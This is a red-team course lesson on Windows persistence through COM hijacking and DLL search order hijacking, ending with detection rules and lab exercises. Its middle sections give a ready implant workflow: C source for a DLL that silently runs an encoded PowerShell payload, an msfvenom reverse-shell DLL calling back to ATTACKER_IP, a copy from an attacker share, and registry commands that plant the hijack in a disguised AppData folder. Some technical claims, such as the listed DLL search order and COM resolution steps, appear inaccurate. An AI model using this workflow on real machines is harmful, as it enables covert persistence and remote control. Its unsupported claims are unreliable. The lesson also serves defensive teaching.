---
title: "Advanced Persistence — COM Hijacking and DLL Search Order Hijacking"
tags: [red-team, persistence, COM-hijacking, DLL-hijacking, T1546.015, T1574.001,
  T1574.002, ATT&CK, HKCU, DLL-side-loading, detection, hardening]
module: 08-RedTeam-03
day: 532
related_topics:
  - WMI Event Subscriptions (Day 531)
  - Advanced Persistence Lab (Day 533)
  - LOLAD Living Off The Land (Day 518)
  - AV and EDR Evasion (Day 519)
---

# Day 532 — COM Hijacking and DLL Search Order Hijacking

> "COM hijacking is the elegance of using a mechanism that every developer
> trusts and every application relies on. You are not injecting code into a
> process — you are redirecting a legitimate lookup through a key you control.
> The application opens your DLL because the OS told it to. That is not a bug
> in the application. That is the application working exactly as designed,
> pointed at your code instead of Microsoft's."
>
> — Ghost

---

## Goals

Understand COM object resolution order and how HKCU overrides HKLM.
Identify COM objects that can be hijacked without administrator privileges.
Build a COM hijack that persists and executes on user logon.
Understand DLL search order and weaponise it via DLL sideloading.
Detect both techniques across registry and file system artefacts.

**Prerequisites:** Day 531 (WMI persistence), Windows registry fundamentals,
basic C/C++ or DLL compilation basics (msfvenom or mingw-w64 acceptable).
**Time budget:** 5 hours.

---

## Part 1 — COM Object Architecture and Hijacking Principle

```
COM (Component Object Model) is a Windows binary interface standard.
Applications load COM objects to access functionality without linking directly.

COM resolution order when an application calls CoCreateInstance(CLSID, ...):

  1. HKCU\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32
     → Per-user COM registration (no admin required to write)
  2. HKLM\SOFTWARE\Classes\CLSID\{CLSID-GUID}\InprocServer32
     → System-wide COM registration (admin required to write)
  3. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility

The attack:
  If an application loads a COM object only registered in HKLM (not in HKCU),
  an attacker with standard user rights can create the HKCU key.
  The next time the application tries to load that COM object, the OS resolves
  it to the attacker's HKCU entry — pointing to an attacker-controlled DLL.

Why this matters for persistence:
  Many applications that run on every user logon (Explorer, Task Manager,
  various Windows shell components) load COM objects registered in HKLM only.
  Create the HKCU override → your DLL loads every time that component runs.
  No admin required. No visible process creation. Runs in-process.
```

### Finding Hijackable COM Objects — Tooling

```powershell
# Method 1: Procmon-based discovery
# Filter: Path starts with HKCU\Software\Classes\CLSID
#         Result is NAME NOT FOUND
# This shows every COM object the current user's session tried to load
# from HKCU that did not exist — all of these are hijackable

# Method 2: PowerSploit's PowerUp (Find-PathDLLHijack)
Import-Module PowerUp.ps1
Find-PathDLLHijack

# Method 3: Manual registry cross-reference
# List COM objects in HKLM that are also called by autorun components
$autorunCLSIDs = @(
    '{1B1E7CB5-70DC-46F1-8808-E6A17BCF4141}',  # known example
    '{00021401-0000-0000-C000-000000000046}'    # shortcut
)
foreach ($clsid in $autorunCLSIDs) {
    $hkcu = "HKCU:\Software\Classes\CLSID\$clsid"
    if (-not (Test-Path $hkcu)) {
        Write-Output "Hijackable: $clsid"
    }
}

# Method 4: Process Hacker / API Monitor
# Attach to explorer.exe → watch for CoCreateInstance calls with 
# CLSIDs that resolve to REGDB_E_CLASSNOTREG for HKCU path
```

### High-Value COM Objects for Persistence (No Admin Required)

```
The following CLSIDs have been documented as hijackable via HKCU
and are called by Explorer.exe or other autorun components:

{1B1E7CB5-70DC-46F1-8808-E6A17BCF4141}
  → Windows Task Scheduler COM server
  → Loaded by Task Scheduler on every logon
  → InprocServer32 = your DLL path

{B4F4B0A4-8E39-4D47-B2AF-0C2E4F0A1C60}
  → Windows Push Notifications Platform
  → Loaded on logon

{9BA05972-F6A8-11CF-A442-00A0C90A8F39}
  → ShellWindows — loaded by Explorer.exe

Note: The specific CLSIDs change across Windows versions. The technique
is stable; the specific targets must be identified fresh on each target OS.
Use Procmon on the exact OS version you are targeting.
```

---

## Part 2 — Building a COM Hijack Persistence Implant

### Step 1 — Create a Malicious DLL

```c
// persist.c — Minimal COM DLL that executes payload and then
// passes through to the real COM object (stealthy version)

#include <windows.h>

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Execute payload in a new thread to avoid blocking the host
        // Replace with your actual C2 stager or payload
        HANDLE hThread = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)WinExec,
            (LPVOID)"powershell.exe -NoP -W Hidden -NonI "
                    "-EncodedCommand <B64_PAYLOAD>",
            0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
```

```bash
# Compile with mingw-w64 (from Linux attack host)
x86_64-w64-mingw32-gcc -shared -o persist.dll persist.c -lkernel32

# Or use msfvenom for a simpler implant (less OPSEC, useful in labs)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=<ATTACKER_IP> LPORT=4444 \
    -f dll -o persist.dll
```

### Step 2 — Place the DLL and Register HKCU Key

```powershell
# Place the DLL somewhere the target will find it
# Recommended: user's AppData (writable, looks legitimate)
$DllPath = "$env:APPDATA\Microsoft\UpdateCheck\persist.dll"
New-Item -ItemType Directory -Path "$env:APPDATA\Microsoft\UpdateCheck" `
    -Force | Out-Null
Copy-Item "\\attacker\share\persist.dll" $DllPath

# Target CLSID — use one identified from Procmon on this OS
$CLSID = '{1B1E7CB5-70DC-46F1-8808-E6A17BCF4141}'
$RegPath = "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32"

# Create the HKCU override (no admin required)
New-Item -Path $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name '(Default)' -Value $DllPath
Set-ItemProperty -Path $RegPath -Name 'ThreadingModel' -Value 'Apartment'

# Verify
Get-ItemProperty -Path $RegPath
```

### Step 3 — Trigger and Verify

```
Trigger options (depending on target COM object):
  - Log off and log back in (Explorer restart)
  - Kill and restart explorer.exe:  taskkill /f /im explorer.exe
                                    Start-Process explorer.exe
  - Open Task Scheduler (if targeting scheduler CLSID)

Expected result:
  → Your DLL loads in-process with the calling application
  → Reverse shell or C2 beacon established from the target process
  → Process parent: the calling application (explorer.exe, etc.)
  → No new suspicious process creation event
```

---

## Part 3 — DLL Search Order Hijacking

### The DLL Search Order (Windows Default)

```
When a process loads a DLL by name (not absolute path), Windows searches
in this order (with Safe DLL Search Mode enabled, the default):

  1. The application's own directory
  2. C:\Windows\System32
  3. C:\Windows\System32\wbem
  4. C:\Windows\SysWow64
  5. C:\Windows
  6. Directories in the PATH environment variable (user then system)

Attack: if a directory earlier in the search order is writable by the attacker,
and the application tries to load a DLL that does not exist in System32 or
the application directory, the attacker can plant a DLL in the writable location.

Most common scenario:
  - Application in C:\Program Files\VendorApp\ tries to load "version.dll"
  - version.dll is NOT in the application directory
  - It IS in C:\Windows\System32\ (the real one)
  - But if the application directory is writable (bad config), planting
    version.dll there is a DLL hijack
```

### Finding Hijackable Services and Applications

```powershell
# Method 1: Procmon — filter on NAME NOT FOUND + .dll extension
# This reveals every DLL load that falls through to the search path
# Focus on processes that run at startup or as services

# Method 2: PowerSploit Find-ProcessDLLHijack
Find-ProcessDLLHijack

# Method 3: Manual — check PATH directories for write access
$env:PATH -split ';' | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl -and ($acl.AccessToString -match "Everyone.*Modify" -or
                   $acl.AccessToString -match "BUILTIN\\Users.*Modify")) {
        Write-Output "Writable PATH dir: $_"
    }
}

# Method 4: Service DLL hijack (higher privilege)
# Services running as SYSTEM that have DLL load gaps are particularly
# valuable — your DLL runs as SYSTEM when the service starts
Get-WmiObject Win32_Service |
    Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notmatch 'svchost' } |
    Select-Object Name, PathName, StartName
```

### DLL Sideloading (T1574.002) — A Specific Pattern

```
Sideloading exploits a signed, legitimate application that loads DLLs from
its own directory without verifying the DLL's signature.

Attack pattern:
  1. Find a signed, trusted application that loads a vulnerable DLL
  2. Place both the legitimate app and your malicious DLL in the same directory
  3. Execute or create a shortcut to the legitimate app
  4. Result: the app is signed, trusted, potentially whitelisted — but loads
     your unsigned DLL which executes your payload

Classic sideloading targets (historically):
  - microsoft.teams.exe → loads unsigned DLLs from its AppData directory
  - OneDriveSetup.exe → version.dll sideloading (patched)
  - Various antivirus installers (ironic) → unsigned DLL loading
  - Custom vendor apps in C:\Program Files\ with writable directories

Example — OneDrive historical sideloading:
  1. Place your DLL as "version.dll" in the same directory as OneDriveSetup.exe
  2. Execute OneDriveSetup.exe
  3. OneDriveSetup.exe loads your version.dll before searching System32
  4. Payload executes in the context of a signed Microsoft binary
```

---

## Part 4 — Detection

### Detecting COM Hijacking

```
Registry monitoring (Sysmon Event ID 13 — RegistryValueSet):
  logsource:
    product: windows
    service: sysmon
  detection:
    selection:
      EventID: 13
      TargetObject|startswith: 'HKCU\Software\Classes\CLSID\'
      TargetObject|endswith: '\InprocServer32'
    condition: selection
  falsepositives:
    - Legitimate software registering COM objects per-user
    - Some office productivity suites

Supplement: alert if the value set points to a writable user directory
  TargetDetails|contains:
    - '%APPDATA%'
    - '%TEMP%'
    - 'C:\Users\'
```

### Detecting DLL Hijacking

```
Sysmon Event ID 7 (Image Loaded):
  Watch for DLLs loaded from unexpected paths:
  detection:
    ImageLoaded|startswith: 'C:\Users\'
    AND ImageLoaded|endswith: common Windows DLL names
    (version.dll, comctl32.dll, dwmapi.dll, etc.)

Windows Defender Application Control (WDAC) — preventive:
  Enforce DLL signature requirements for specific paths
  Block unsigned DLLs from user-writable locations

File monitoring:
  Alert on DLL creation in PATH directories owned by the user:
    New-Item on .dll in C:\Users\*\AppData\Roaming\*
    New-Item on .dll in any writable directory in %PATH%
```

---

## Exercises

1. Use Procmon on a Windows 10/11 lab VM to identify three COM CLSIDs that
   Explorer.exe attempts to load from HKCU and fails (NAME NOT FOUND). Verify
   that none of these CLSIDs exist under HKCU on a clean install.
2. Build a minimal DLL (using mingw-w64 or Visual Studio) that spawns a
   `calc.exe` when loaded, then register it as a COM hijack in HKCU. Verify
   it fires when Explorer.exe restarts.
3. Use Sysmon Event ID 13 to detect the HKCU COM registration you just created.
   Write the Sigma rule.
4. Find a service or application on your lab VM that loads a DLL by name (not
   absolute path) from a writable directory. Plant a benign DLL that writes a
   timestamp to a file. Verify execution.
5. Explain the difference between T1546.015 (COM hijacking) and T1574.002
   (DLL sideloading). Write one detection Sigma rule for each.

---

## Key Takeaways

1. COM hijacking abuses the legitimate COM resolution order — HKCU before HKLM.
   No admin required. The operating system does the work of loading your DLL.
2. The attack surface is massive: any COM object registered only in HKLM that
   is loaded by a process running on every logon is a persistence candidate.
3. DLL search order hijacking requires a writable directory earlier in the
   search path than the real DLL location. The most valuable targets are
   auto-start services running as SYSTEM.
4. Sideloading is a specific DLL hijack where the attacker controls a directory
   alongside a trusted, signed binary, bypassing application whitelisting that
   only checks the parent binary's signature.
5. Both techniques are detected most reliably through registry and file system
   monitoring (Sysmon 7/13), not by process creation events, which explains
   why they persist in mature environments that only alert on suspicious
   process trees.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q532.1, Q532.2 …).

---

## Navigation

← Previous: [Day 531 — WMI Event Subscriptions](DAY-0531-Advanced-Persistence-WMI-Subscriptions.md)
→ Next: [Day 533 — Advanced Persistence Lab](DAY-0533-Advanced-Persistence-Lab.md)
